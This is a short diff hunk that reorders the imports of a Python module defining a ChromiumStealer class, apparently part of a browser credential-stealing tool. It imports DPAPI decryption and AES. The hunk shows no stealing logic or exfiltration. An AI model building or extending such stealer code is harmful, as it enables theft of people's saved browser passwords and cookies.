@@ -28,17 +28,20 @@ SOFTWARE.
 """
 
 
-import os
-import json
 import base64
-import sqlite3
-from win32crypt import CryptUnprotectData
-from Crypto.Cipher import AES
+import json
+import os
 import shutil
+import sqlite3
 from datetime import datetime
 
-from config.manager import ModuleManager
+from Crypto.Cipher import AES
+from win32crypt import CryptUnprotectData
+
 from config.constants import Constant
+from config.manager import ModuleManager
+
+
 class ChromiumStealer(ModuleManager):
     
     def __init__(self) -> None:
